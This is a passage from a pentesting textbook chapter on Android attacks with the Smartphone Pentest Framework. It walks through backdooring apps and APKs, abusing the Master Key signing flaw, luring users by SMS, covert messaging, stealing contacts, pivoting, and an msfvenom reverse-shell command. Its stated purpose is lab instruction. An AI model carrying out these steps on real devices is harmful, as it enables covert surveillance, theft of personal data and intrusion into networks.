Filename: <span class="strong"><strong>/book2.html</strong></span>&#13;
Phone Number to Attack: <span class="strong"><strong>15555215558</strong></span></pre></div></div><p><a class="indexterm" id="iddle1041"/>To run the safe USSD example in SPF, choose menu option <span class="strong"><strong><code class="literal">6</code></strong></span>, then <code class="literal">3.) USSD Webpage Attack (Safe)</code> ❶. You’ll be asked for the location of the web server, the name of the malicious page, and the phone number to text it to. Send it to your Android 2.1 emulator.</p><p>Now open the page in the SMS you receive on the Android 2.1 emulator. This time, instead of crashing the browser, the dialer app opens, and a pop-up notification appears, as shown in <a class="xref" href="ch20.xhtml#ussd_autodial" title="Figure 20-2. USSD autodial">Figure 20-2</a>.</p><div class="figure"><a id="ussd_autodial"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00200"/><img alt="USSD autodial" src="httpatomoreillycomsourcenostarchimages2030590.png.jpg"/></div></div><div class="figure-title">Figure 20-2. USSD autodial</div></div><p>As it turns out, our emulator has no unique identifier, so the number is blank. Though this example was not harmful to the device or its data, other USSD codes can be if they are opened in the dialer.</p><div class="note" title="Note"><h3 class="title"><a id="ch20note03"/>Note</h3><p><a class="indexterm" id="iddle1090"/><a class="indexterm" id="iddle1736"/><a class="indexterm" id="iddle2176"/><a class="indexterm" id="iddle2199"/>Of course, this vulnerability, as well as the WebKit issue we exploited in the previous section, has been patched since its discovery. Android has a complicated relationship with security updates. The problem is that anyone can make an Android device with its own implementation of the Android OS. When Google releases a new version with a set of patches, every original equipment manufacturer (OEM) needs to port the changes to its version of Android, and the carriers need to push updates to their devices. However, updates are not delivered consistently, which means that millions of unpatched devices may be in use, depending on the model and the carrier.</p></div><p>Now let’s turn our attention to a vulnerability that will probably never be patched: malicious applications.</p></div></div><div class="sect1" title="Malicious Apps"><div class="titlepage"><div><div><h2 class="title" id="malicious_apps" style="clear: both">Malicious Apps</h2></div></div></div><p>We’ve studied malicious programs intermittently throughout this book. We created malicious executables with Msfvenom in <a class="xref" href="ch04.xhtml" title="Chapter 4. Using the Metasploit Framework">Chapter 4</a>, uploaded backdoors to vulnerable web servers in <a class="xref" href="ch08.xhtml" title="Chapter 8. Exploitation">Chapter 8</a>, looked at social-engineering attacks to trick users into downloading and running malicious programs in <a class="xref" href="ch11.xhtml" title="Chapter 11. Social Engineering">Chapter 11</a>, and bypassed antivirus programs in <a class="xref" href="ch12.xhtml" title="Chapter 12. Bypassing Antivirus Applications">Chapter 12</a>.</p><p>While social engineering and users undermining security policies by running malicious programs will likely be major issues for enterprise security for years to come, mobile devices make this issue even more complicated. It’s hard to imagine anyone giving you a laptop computer for work and encouraging you to go out to the Internet and download every potentially interesting, fun, or productivity-increasing program you can find—but that’s exactly how mobile devices are marketed. (“Buy our device. It has the best apps.” “Download our apps. They’re the best in productivity/entertainment/security.”) Mobile antivirus applications often require extreme permissions and even administrative functions on the device in order to run, and mobile device management solutions typically require installing even more applications on the device.</p><p>Mobile users are inundated with reasons to download apps to their devices, and mobile malware is on the rise, much of it in the form of malicious applications. If a user can be tricked into installing a malicious app, the attacker can utilize Android’s APIs to steal data, gain remote control, and even attack other devices.</p><p>In the Android security model, apps must request permissions to use APIs that could be used maliciously, and users must accept the requested permissions at installation. Unfortunately, users often grant access to all sorts of potentially dangerous permissions. We can use Android permissions to control the device without running an additional exploit after the user installs the malicious app.</p><div class="sect2" title="Creating Malicious SPF Agents"><div class="titlepage"><div><div><h3 class="title" id="creating_malicious_spf_agents">Creating Malicious SPF Agents</h3></div></div></div><p><a class="indexterm" id="iddle1048"/>SPF allows us to create a malicious app with a variety of interesting functionality. Earlier we used the SPF app on our pentester-controlled device to allow SPF to use the device’s mobile modem and other functionality; our goal here is to trick users into installing the SPF agent on target devices.</p><p>As of this writing, SPF agents can receive commands by checking in to a web server over HTTP or via hidden SMS messages from an SPF-controlled mobile modem. Naturally, we’ll be more successful if our agent appears to be an interesting and/or trustworthy app. We can embed the agent inside any legitimate app: SPF can take a compiled APK file and backdoor it with the agent, or if we have the source code of the app, we can backdoor that as well.</p><div class="sect3" title="Backdooring Source Code"><div class="titlepage"><div><div><h4 class="title" id="backdooring_source_code">Backdooring Source Code</h4></div></div></div><p>Let’s use backdooring source code for our example. Choose <code class="literal">1.) Attach Framework to a Deployed Agent/Create Agent</code> at the main SPF menu. SPF includes a couple of app templates that we can use for our example. You can also import any app source code into SPF with option <code class="literal">4</code>. If you don’t have source code for the app you want to impersonate, you can use option <code class="literal">5</code> to backdoor a compiled APK. You can even use the Android Master Key vulnerability discovered in 2013 to replace applications already installed on the device with a backdoored version. For now, let’s just use one of SPF’s templates, as shown in <a class="xref" href="ch20.xhtml#building_the_android_agent" title="Example 20-11. Building the Android agent">Example 20-11</a>.</p><div class="example"><a id="building_the_android_agent"/><div class="example-title">Example 20-11. Building the Android agent</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>1</strong></span>&#13;
&#13;
Select An Option from the Menu:&#13;
    1.) Attach Framework to a Deployed Agent&#13;
    2.) Generate Agent App&#13;
    3.) Copy Agent to Web Server&#13;
    4.) Import an Agent Template&#13;
    5.) Backdoor Android APK with Agent&#13;
    6.) Create APK Signing Key&#13;
&#13;
spf&gt; <span class="strong"><strong>2</strong></span>❶&#13;
    1.) MapsDemo&#13;
    2.) BlankFrontEnd&#13;
&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❷&#13;
Phone number of the control modem for the agent: <span class="strong"><strong>15555215554</strong></span>❸&#13;
Control key for the agent: <span class="strong"><strong>KEYKEY1</strong></span>❹&#13;
Webserver control path for agent: <span class="strong"><strong>/androidagent1</strong></span>❺&#13;
Control Number:15555215554&#13;
Control Key:KEYKEY1&#13;
ControlPath:/androidagent1&#13;
Is this correct?(y/n) <span class="strong"><strong>y</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
BUILD SUCCESSFUL</pre></div></div><p><a class="indexterm" id="iddle2172"/><a class="indexterm" id="iddle2351"/>Choose <code class="literal">2.) Generate Agent App</code> ❶. We’ll use the MapsDemo example template ❷ distributed with Android SDK by Google to demonstrate functionality. When prompted, give the phone number to send SMS commands to ❸, the SPF the seven-character key ❹, and the directory to check in for HTTP commands ❺. For the agent key and path, use the same values that you used when you created the SPF app (<a class="xref" href="ch20.xhtml#building_the_android_app" title="Building the Android App">Building the Android App</a>). Use the Android 4.3 emulator (SPF app) phone number as the control phone number. SPF will build the Android agent in the chosen template.</p><p>Now to entice the user into downloading and installing the agent, a process similar to our client-side attacks, following the steps in <a class="xref" href="ch20.xhtml#enticing_the_user_into_installing_the_ag" title="Example 20-12. Enticing the user into installing the agent">Example 20-12</a>.</p><div class="example"><a id="enticing_the_user_into_installing_the_ag"/><div class="example-title">Example 20-12. Enticing the user into installing the agent</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>6</strong></span>&#13;
&#13;
Choose a social engineering or client side attack to launch:&#13;
    1.) Direct Download Agent&#13;
    2.) Client Side Shell&#13;
    3.) USSD Webpage Attack (Safe)&#13;
    4 ) USSD Webpage Attack (Malicious)&#13;
&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❶&#13;
This module sends an SMS with a link to directly download and install an Agent&#13;
Deliver Android Agent or Android Meterpreter (Agent/meterpreter:) <span class="strong"><strong>Agent</strong></span>❷&#13;
Hosting Path: <span class="strong"><strong>/spfbook3</strong></span>❸&#13;
Filename: <span class="strong"><strong>/maps.apk</strong></span>&#13;
Delivery Method:(SMS or NFC): <span class="strong"><strong>SMS</strong></span>&#13;
Phone Number to Attack: <span class="strong"><strong>15555215556</strong></span>&#13;
Custom text(y/N)? <span class="strong"><strong>N</strong></span></pre></div></div><p>Choose option <span class="strong"><strong><code class="literal">6</code></strong></span> at the main menu, and then choose <code class="literal">1.) Direct Download Agent</code> ❶. You will be asked if you want to send the Android agent or Android Meterpreter (a recent addition to Metasploit). Because we’re working with the Android agent, choose <span class="strong"><strong><code class="literal">Agent</code></strong></span> ❷. As usual, you are prompted for the path, app name on the web server, attack vector, and the number to attack, beginning at ❸. Instruct SPF to send an SMS with default text to the Android 2.2 emulator.</p><p>On the Android 2.2 emulator, click the link in the SMS when it arrives. The app should be downloaded. After it downloads, click <span class="strong"><strong>Install</strong></span>, accept the permissions, and open the app. As shown in <a class="xref" href="ch20.xhtml#backdoored_app" title="Figure 20-3. Backdoored app">Figure 20-3</a>, the agent will look and feel like the original app template (the Google Maps demo), but it has some extra functionality in the background.</p><div class="figure"><a id="backdoored_app"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00201"/><img alt="Backdoored app" src="httpatomoreillycomsourcenostarchimages2030592.png.jpg"/></div></div><div class="figure-title">Figure 20-3. Backdoored app</div></div><p><a class="indexterm" id="iddle1064"/><a class="indexterm" id="iddle2174"/>Now to attach SPF to the deployed agent. If you send an SMS campaign to lots of numbers, who knows how many users will install the agent or how quickly, but the agent has check-in functionality (see <a class="xref" href="ch20.xhtml#attaching_spf_to_the_deployed_agent" title="Example 20-13. Attaching SPF to the deployed agent">Example 20-13</a>) that will respond to SPF’s query to see if it is deployed.</p><div class="example"><a id="attaching_spf_to_the_deployed_agent"/><div class="example-title">Example 20-13. Attaching SPF to the deployed agent</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>1</strong></span>&#13;
&#13;
Select An Option from the Menu:&#13;
    1.) Attach Framework to a Deployed Agent&#13;
    2.) Generate Agent App&#13;
    3.) Copy Agent to Web Server&#13;
    4.) Import an Agent Template&#13;
    5.) Backdoor Android APK with Agent&#13;
    6.) Create APK Signing Key&#13;
&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❶&#13;
Attach to a Deployed Agent:&#13;
&#13;
This will set up handlers to control an agent that has already been deployed.&#13;
&#13;
Agent URL Path: <span class="strong"><strong>/androidagent1</strong></span>❷&#13;
Agent Control Key: <span class="strong"><strong>KEYKEY1</strong></span>❸&#13;
Communication Method(SMS/HTTP): <span class="strong"><strong>HTTP</strong></span>❹&#13;
&#13;
URL Path: /androidagent1&#13;
Control Key: KEYKEY1&#13;
Communication Method(SMS/HTTP): <span class="strong"><strong>HTTP</strong></span>&#13;
Is this correct?(y/N): <span class="strong"><strong>y</strong></span></pre></div></div><p>Choose option <span class="strong"><strong><code class="literal">1</code></strong></span> at the main menu and then choose <code class="literal">1.) Attach Framework</code> <code class="literal">to a</code> <code class="literal">Deployed Agent</code> ❶. You are prompted for the path ❷, key ❸, and communication method ❹. Enter the values you used when creating the agent.</p><p>SPF will appear to hang for a minute as it waits for the agent to respond. After it returns to the menu, you should be connected to the agent. Now choose <code class="literal">2.) Send Commands to an Agent</code> from the main menu. You will be presented with a list of agents in the database; you should see the agent you just attached to SPF in the list as shown here.</p><a id="pro_id00222"/><pre class="programlisting">spf&gt; <span class="strong"><strong>2</strong></span>&#13;
Available Agents:&#13;
15555215556</pre></div><div class="sect3" title="Backdooring APKs"><div class="titlepage"><div><div><h4 class="title" id="backdooring_apks">Backdooring APKs</h4></div></div></div><p>Before we move on to using our deployed SPF agent, let’s look at another, perhaps more sophisticated, way of creating an agent. Because you may not always have the source code of the app you want to backdoor, SPF can work with the precompiled APK file. Any APK, including those in the Google Play store, are in scope.</p><p><a class="indexterm" id="iddle1049"/><a class="indexterm" id="iddle1065"/><a class="indexterm" id="iddle1448"/><a class="indexterm" id="iddle1524"/><a class="indexterm" id="iddle2162"/>To backdoor an APK with the SPF agent, choose <span class="strong"><strong><code class="literal">1</code></strong></span> from the main menu, and then <code class="literal">5.) Backdoor Android APK with Agent</code>, as shown in <a class="xref" href="ch20.xhtml#backdooring_an_apk" title="Example 20-14. Backdooring an APK">Example 20-14</a>.</p><div class="example"><a id="backdooring_an_apk"/><div class="example-title">Example 20-14. Backdooring an APK</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>1</strong></span>&#13;
&#13;
Select An Option from the Menu:&#13;
    1.) Attach Framework to a Deployed Agent&#13;
    2.) Generate Agent App&#13;
    3.) Copy Agent to Web Server&#13;
    4.) Import an Agent Template&#13;
    5.) Backdoor Android APK with Agent&#13;
    6.) Create APK Signing Key&#13;
spf&gt; <span class="strong"><strong>5</strong></span>&#13;
APKTool not found! Is it installed? Check your config file&#13;
Install Android APKTool(y/N)?&#13;
spf&gt; <span class="strong"><strong>y</strong></span>&#13;
&#13;
--2015-12-04 12:28:21--  https://android-apktool.googlecode.com/files/apktool-install-linux-r05-ibot.tar.bz2&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
Puts the Android Agent inside an Android App APK. The application runs normally with extra functionality&#13;
APK to Backdoor: <span class="strong"><strong>/root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk</strong></span>&#13;
I: Baksmaling...&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p>SPF does not install the APKTool program, required to decompile APKs, by default; it asks if you want to install it. Enter <span class="strong"><strong><code class="literal">y</code></strong></span>, and SPF will install APKTool and continue.</p><p>When prompted, tell SPF to backdoor the APK <span class="emphasis"><em>/root/Smartphone-Pentest-Framework/APKs/MapsDemo.apk</em></span> (a compiled version of the Google Maps demo code used previously). SPF will then decompile the APK, combine it with the SPF agent, and recompile it.</p><p>To set up the agent, SPF needs to know the control phone number, control key, and control path. This is the same information we used when backdooring source code and is shown in <a class="xref" href="ch20.xhtml#setting_options-id00053" title="Example 20-15. Setting options">Example 20-15</a>.</p><div class="example"><a id="setting_options-id00053"/><div class="example-title">Example 20-15. Setting options</div><div class="example-contents"><pre class="programlisting">Phone number of the control modem for the agent: <span class="strong"><strong>15555215554</strong></span>&#13;
Control key for the agent: <span class="strong"><strong>KEYKEY1</strong></span>&#13;
Webserver control path for agent: <span class="strong"><strong>/androidagent1</strong></span>&#13;
Control Number: 15555215554&#13;
Control Key:KEYKEY1&#13;
ControlPath:/androidagent1&#13;
Is this correct?(y/n) <span class="strong"><strong>y</strong></span>&#13;
--<span class="emphasis"><em>snip</em></span>--</pre></div></div><p><a class="indexterm" id="iddle1977"/>After APKTool recompiles the backdoored APK, we need to sign it. At installation, the Android device checks the signatures on an APK. If it is not signed, it will be rejected, even by an emulator. Google Play apps are signed using a developer key registered with Google Play.</p><p>To run apps on emulators and devices that are not restricted to Google Play apps, we just use a debug key that is not registered with Google, but the app still must be signed. We were able to skip this step when backdooring source code because we compiled the code with the Android SDK, which automatically signed our code with the default Android keystore. Because we used APKTool here, we need to manually re-create the signature.</p><p>You will be asked whether you want to use the Android Master Key vulnerability, which allows attackers and pentesters to trick the Android signature-verification process into thinking our app is a legitimate update to an already installed application. In other words, we will be allowed to replace legitimate applications with our code, and the Android system will view them as legitimate updates from the vendor. (This flaw in the verification process was fixed in Android 4.2.) To use the Android Master Key vulnerability, enter <span class="strong"><strong><code class="literal">y</code></strong></span> at the prompt, as shown next.</p><div class="note" title="Note"><h3 class="title"><a id="ch20note04"/>Note</h3><p>To leverage this issue, the original application and its signatures are copied into our backdoored APK. Details about how this triggers the Master Key vulnerability can be found here: http://www.saurik.com/id/17.</p></div><a id="pro_id00223"/><pre class="programlisting">Use Android Master Key Vuln?(y/N): <span class="strong"><strong>y</strong></span>&#13;
Archive:  /root/Desktop/abcnews.apk&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
Inflating: unzipped/META-INF/CERT.RSA</pre><p>To see the Android Master Key vulnerability at work, install the legitimate version of <span class="emphasis"><em>MapsDemo.apk</em></span> from <span class="emphasis"><em>/root/Smartphone-Pentest-Framework/APKs</em></span> onto a device running an Android version earlier than 4.2, and then try to install the backdoored version you just created by delivering it via SMS or NFC with SPF. You should be prompted to replace <span class="emphasis"><em>MapsDemo.apk</em></span>, and the signature verification should succeed, even though we didn’t have access to the private keys required to build a correct signature for our backdoored version.</p><p>If your target is not vulnerable to Master Key or the app is not already on the target device, you can just sign the app with your default key for the Android keystore on Kali. To do this, enter <span class="strong"><strong><code class="literal">n</code></strong></span> at the prompt for Use Android Master Key Vuln, as shown in <a class="xref" href="ch20.xhtml#signing_the_apk" title="Example 20-16. Signing the APK">Example 20-16</a>.</p><div class="example"><a id="signing_the_apk"/><div class="example-title">Example 20-16. Signing the APK</div><div class="example-contents"><pre class="programlisting">Use Android Master Key Vuln?(y/N): <span class="strong"><strong>n</strong></span>&#13;
Password for Debug Keystore is android&#13;
Enter Passphrase for keystore:&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
  signing: resources.arsc</pre></div></div><p><a class="indexterm" id="iddle1511"/>You are prompted for the password for the debug keystore. By default, this action does not sign the APK with a key for publishing it on Google Play, but it will work for our purposes. The app is now signed with a debug key and should install on any device that does not restrict apps to official Play Store apps. Note that there’s nothing stopping a pentester from signing the app with a legitimate Google Play key they have registered if it’s in the scope of the pentest to attempt to trick users into downloading malicious apps from the Google Play store.</p><div class="note" title="Note"><h3 class="title"><a id="ch20note05"/>Note</h3><p>The backdoored APK is functionality equivalent to the agent we created in <a class="xref" href="ch20.xhtml#backdooring_source_code" title="Backdooring Source Code">Backdooring Source Code</a> and can be deployed the same way. Of course, we already have a deployed agent to work with as we look at what we can do to a device and its local network after an agent is deployed.</p></div></div></div></div><div class="sect1" title="Mobile Post Exploitation"><div class="titlepage"><div><div><h2 class="title" id="mobile_post_exploitation" style="clear: both">Mobile Post Exploitation</h2></div></div></div><p>Now that we’re on the device, we have a few options open to us. We can gather local information from the device such as contacts or received SMS messages, and we can remotely control the device to have it do things like take a picture. If we’re unsatisfied with our permissions, we can attempt to perform privilege escalation on the device and get root privileges. We can even use the exploited mobile device to attack other devices on the network. (This attack can be particularly interesting if the device connects directly to a corporate network or uses a VPN to access one.)</p><div class="sect2" title="Information Gathering"><div class="titlepage"><div><div><h3 class="title" id="information_gathering-id00054">Information Gathering</h3></div></div></div><p>We will run an example of information gathering by getting a list of installed applications on the infected device as shown in <a class="xref" href="ch20.xhtml#running_a_command_on_an_agent" title="Example 20-17. Running a command on an agent">Example 20-17</a>.</p><div class="example"><a id="running_a_command_on_an_agent"/><div class="example-title">Example 20-17. Running a command on an agent</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>2</strong></span>&#13;
View Data Gathered from a Deployed Agent:&#13;
Available Agents:&#13;
    1.) 15555215556&#13;
Select an agent to interact with or 0 to return to the previous menu.&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❶&#13;
Commands:❷&#13;
    1.) Send SMS&#13;
    2.) Take Picture&#13;
    3.) Get Contacts&#13;
    4.) Get SMS Database&#13;
    5.) Privilege Escalation&#13;
    6.) Download File&#13;
    7.) Execute Command&#13;
    8.) Upload File&#13;
    9.) Ping Sweep&#13;
    10.) TCP Listener&#13;
    11.) Connect to Listener&#13;
    12.) Run Nmap&#13;
    13.) Execute Command and Upload Results&#13;
    14.) Get Installed Apps List&#13;
    15.) Remove Locks (Android &lt; 4.4)&#13;
    16.) Upload APK&#13;
    17.) Get Wifi IP Address&#13;
Select a command to perform or 0 to return to the previous menu&#13;
spf&gt; <span class="strong"><strong>14</strong></span>❸&#13;
    Gets a list of installed packages(apps) and uploads to a file.&#13;
Delivery Method(SMS or HTTP): <span class="strong"><strong>HTTP</strong></span>❹</pre></div></div><p><a class="indexterm" id="iddle1742"/><a class="indexterm" id="iddle2055"/><a class="indexterm" id="iddle2354"/>Choose option <span class="strong"><strong><code class="literal">2</code></strong></span> from the main menu, then select the agent from the list ❶. When presented with a list of available agent functionality ❷, choose <code class="literal">14.) Get Installed Apps List</code> ❸. SPF asks how you would like to deliver the command; we’ll use HTTP ❹. (Recall that agents can communicate and receive commands via HTTP and SMS.)</p><p>Enter <span class="strong"><strong><code class="literal">0</code></strong></span> to return to the previous menu until you reach the main menu. Wait a minute, and then choose <code class="literal">3.) View Information Gathered</code>, as shown in <a class="xref" href="ch20.xhtml#viewing_gathered_data" title="Example 20-18. Viewing gathered data">Example 20-18</a>.</p><div class="example"><a id="viewing_gathered_data"/><div class="example-title">Example 20-18. Viewing gathered data</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>3</strong></span>&#13;
View Data Gathered from a Deployed Agent:&#13;
Agents or Attacks? <span class="strong"><strong>Agents</strong></span>❶&#13;
Available Agents:&#13;
    1.) 15555215556&#13;
Select an agent to interact with or 0 to return to the previous menu.&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❷&#13;
Data:&#13;
SMS Database:&#13;
Contacts:&#13;
Picture Location:&#13;
Rooted:&#13;
Ping Sweep:&#13;
File:&#13;
Packages: package:com.google.android.location❸&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
package:com.android.providers.downloads&#13;
package:com.android.server.vpn</pre></div></div><p>You are asked if you want to see the results of Attacks or Agents; type <span class="strong"><strong><code class="literal">Agents</code></strong></span> ❶. Choose our agent ❷. Information about the device is pulled from the database, though currently all we have is a list of installed apps, gathered by the previous command ❸. (You can run additional information-gathering commands to fill in more entries.)</p></div><div class="sect2" title="Remote Control"><div class="titlepage"><div><div><h3 class="title" id="remote_control">Remote Control</h3></div></div></div><p>Now let’s see how to use the agent to remotely control the device. We can tell the device to send a text message that will not show up in the sent messages of the SMS app. In fact, the user will have no indication that a message <a class="indexterm" id="iddle1675"/><a class="indexterm" id="iddle1733"/><a class="indexterm" id="iddle1738"/><a class="indexterm" id="iddle1943"/>was sent at all—what better way to exploit the circle of trust? Perhaps we can grab all the user’s contacts and send them messages telling them they should install our cool app, which just so happens to point to the SPF agent. Because the message comes from someone they know, the users will be more likely to install the agent.</p><p>Let’s just send an example message for now, as shown in <a class="xref" href="ch20.xhtml#remotely_controlling_an_agent" title="Example 20-19. Remotely controlling an agent">Example 20-19</a>.</p><div class="example"><a id="remotely_controlling_an_agent"/><div class="example-title">Example 20-19. Remotely controlling an agent</div><div class="example-contents"><pre class="programlisting">Commands:&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
Select a command to perform or 0 to return to the previous menu&#13;
spf&gt; <span class="strong"><strong>1</strong></span>❶&#13;
Send an SMS message to another phone. Fill in the number, the message to send, and the delivery method(SMS or HTTP).&#13;
Number: <span class="strong"><strong>15555215558</strong></span>&#13;
Message: <span class="strong"><strong>hiya Georgia</strong></span>&#13;
Delivery Method(SMS or HTTP) <span class="strong"><strong>SMS</strong></span></pre></div></div><p>From the agent commands menu, select option <code class="literal">1.) Send SMS</code> ❶. When prompted for a phone number, message contents, and how you want to deliver the command, tell your agent to send the message to the Android 2.1 emulator.</p><p>Your Android 2.1 emulator will receive an SMS with the text you entered from the Android 2.2 emulator, with no indication on either emulator that this is not a normal message.</p></div><div class="sect2" title="Pivoting Through Mobile Devices"><div class="titlepage"><div><div><h3 class="title" id="pivoting_through_mobile_devices">Pivoting Through Mobile Devices</h3></div></div></div><p>Mobile Device Management (MDM) and mobile antivirus applications have a long way to go. The number of companies that mandate these solutions for their employees is still small when compared with many other security controls, and some companies choose not to allow mobile devices at all. But let’s face it: Employees probably know the company’s wireless password. Connect your mobile device, and magically it’s a member of the same network as your workstation and other devices that might contain sensitive information.</p><p>Naturally, companies are much better at hardening their externally facing assets. After all, these devices are open to attack from anyone on the Internet, and they get the lion’s share of the attention. But internally, things start to break down. Weak passwords, missing patches, and out-of-date client-side software are all issues we’ve examined in this book that could be lurking in the internal network. If an exploited mobile device has direct network access to these vulnerable systems, we may be able to use it as a pivot to launch additional attacks, completely bypassing the perimeter.</p><p>We studied pivoting in <a class="xref" href="ch13.xhtml" title="Chapter 13. Post Exploitation">Chapter 13</a>, when we used an exploited machine to move from one network to another. We can do the same thing here using the SPF agent, effectively running a pentest on the mobile network through the exploited mobile device, as illustrated in <a class="xref" href="ch20.xhtml#pivoting_through_an_infected_mobile_devi" title="Figure 20-4. Pivoting through an infected mobile device to attack internal devices">Figure 20-4</a>.</p><div class="figure"><a id="pivoting_through_an_infected_mobile_devi"/><div class="figure-contents"><div class="mediaobject"><a id="med_id00202"/><img alt="Pivoting through an infected mobile device to attack internal devices" src="httpatomoreillycomsourcenostarchimages2030594.png.jpg"/></div></div><div class="figure-title">Figure 20-4. Pivoting through an infected mobile device to attack internal devices</div></div><div class="sect3" title="Portscanning with Nmap"><div class="titlepage"><div><div><h4 class="title" id="portscanning_with_nmap">Portscanning with Nmap</h4></div></div></div><p><a class="indexterm" id="iddle1739"/><a class="indexterm" id="iddle1837"/><a class="indexterm" id="iddle1957"/>We start by seeing what devices are out there using an agent command option to ping sweep the local network. Next, we’ll do some port scanning, as discussed in <a class="xref" href="ch05.xhtml" title="Chapter 5. Information Gathering">Chapter 5</a>. As it turns out you can install Nmap Android binaries on the exploited device. SPF has install scripts for this and other supporting tools. Choose option <code class="literal">10.) Install Stuff</code> from the main menu, and tell SPF to install Nmap for Android, as shown in <a class="xref" href="ch20.xhtml#installing_nmap_for_android" title="Example 20-20. Installing Nmap for Android">Example 20-20</a>.</p><div class="example"><a id="installing_nmap_for_android"/><div class="example-title">Example 20-20. Installing Nmap for Android</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>10</strong></span>&#13;
&#13;
What would you like to Install?&#13;
    1.) Android SDKS&#13;
    2.) Android APKTool&#13;
    3.) Download Android Nmap&#13;
spf&gt; <span class="strong"><strong>3</strong></span>&#13;
&#13;
Download Nmap for Android(y/N)?&#13;
spf&gt; <span class="strong"><strong>y</strong></span></pre></div></div><p>Now to run Nmap from our Android agent using option <code class="literal">12.) Run Nmap</code>. Let’s run Nmap against our Windows XP target ❶, as shown in <a class="xref" href="ch20.xhtml#running_nmap_from_android" title="Example 20-21. Running Nmap from Android">Example 20-21</a>. Make sure that the War-FTP program we exploited in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a> and <a class="xref" href="ch18.xhtml" title="Chapter 18. Structured Exception Handler Overwrites">Chapter 18</a> is still running. (We’ll exploit it through the pivot in the next section.)</p><div class="example"><a id="running_nmap_from_android"/><div class="example-title">Example 20-21. Running Nmap from Android</div><div class="example-contents"><pre class="programlisting">Select a command to perform or 0 to return to the previous menu&#13;
spf&gt; <span class="strong"><strong>12</strong></span>&#13;
&#13;
    Download Nmap and port scan a host of range. Use any accepted format for target specification in Nmap&#13;
Nmap Target: <span class="strong"><strong>192.168.20.10</strong></span>❶&#13;
Delivery Method(SMS or HTTP) <span class="strong"><strong>HTTP</strong></span></pre></div></div><p><a class="indexterm" id="iddle1042"/><a class="indexterm" id="iddle1152"/><a class="indexterm" id="iddle1381"/><a class="indexterm" id="iddle2178"/>Let Nmap run for a couple of minutes, and then check your agent’s gathered information. You should notice that the File field links to <span class="emphasis"><em>/root/Smartphone-Pentest-Framework/frameworkconsole/text.txt</em></span>. View the contents of this file—you should see something similar to <a class="xref" href="ch20.xhtml#nmap_results" title="Example 20-22. Nmap results">Example 20-22</a>.</p><div class="example"><a id="nmap_results"/><div class="example-title">Example 20-22. Nmap results</div><div class="example-contents"><pre class="programlisting"># Nmap 5.61TEST4 scan initiated Sun Sep  6 23:41:30 2015 as: /data/data/com.example.android.google&#13;
.apis/files/nmap -oA /data/data/com.example.android.google.apis/files/nmapoutput 192.168.20.10&#13;
Nmap scan report for 192.168.20.10&#13;
Host is up (0.0068s latency).&#13;
Not shown: 992 closed ports&#13;
PORT     STATE SERVICE&#13;
21/tcp   open  ftp&#13;
--<span class="emphasis"><em>snip</em></span>--&#13;
&#13;
# Nmap done at Sun Sep  6 23:41:33 2015 -- 1 IP address (1 host up) scanned in 3.43 seconds</pre></div></div><p>Rather than run an entire pentest using the exploited mobile device as a pivot, let’s finish by running an exploit through the SPF agent.</p></div><div class="sect3" title="Exploiting a System on the Local Network"><div class="titlepage"><div><div><h4 class="title" id="exploiting_a_system_on_the_local_network">Exploiting a System on the Local Network</h4></div></div></div><p>Unfortunately, Android devices don’t know scripting languages such as Python and Perl by default; to run an exploit, we need some C code. A simple C version of the exploit we wrote for War-FTP 1.65 in <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a> is in <span class="emphasis"><em>/root/Smartphone-Pentest-Framework/exploits/Windows/warftpmeterpreter.c</em></span>. The included shellcode runs a <span class="emphasis"><em>windows/meterpreter/reverse_tcp</em></span> payload and sends it back to 192.168.20.9 on port 4444. If your Kali system is at another IP address, regenerate the shellcode with Msfvenom, as shown here. (Don’t forget the bad characters for War-FTP from <a class="xref" href="ch17.xhtml" title="Chapter 17. A Stack-Based Buffer Overflow in Windows">Chapter 17</a>. We can avoid them with Msfvenom using the <code class="literal">-b</code> flag.)</p><a id="pro_id00224"/><pre class="programlisting">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.20.9 -f c -b '\x00\x0a\x0d\x40'</pre><p>Once you’ve replaced the shellcode in the exploit, if necessary, we need to compile the C code to run on an Android device. If we use GCC, as in <a class="xref" href="ch03.xhtml" title="Chapter 3. Programming">Chapter 3</a>, the exploit will run fine from our Kali box, but the ARM processor on our Android phones won’t know what to make of it.</p><p>We briefly ran into cross compilers for Windows in <a class="xref" href="ch12.xhtml" title="Chapter 12. Bypassing Antivirus Applications">Chapter 12</a> that allowed us to compile C code on Kali to run on Windows. We can do the <a class="indexterm" id="iddle1765"/><a class="indexterm" id="iddle1783"/>same thing for Android as long as we have an ARM cross compiler. Luckily, SPF has one. As shown in <a class="xref" href="ch20.xhtml#compiling_c_code_to_run_on_android" title="Example 20-23. Compiling C code to run on Android">Example 20-23</a>, choose option <code class="literal">9.) Compile code to run on mobile devices</code> from the main menu.</p><div class="example"><a id="compiling_c_code_to_run_on_android"/><div class="example-title">Example 20-23. Compiling C code to run on Android</div><div class="example-contents"><pre class="programlisting">spf&gt; <span class="strong"><strong>9</strong></span>&#13;
&#13;
Compile code to run on mobile devices&#13;
    1.) Compile C code for ARM Android&#13;
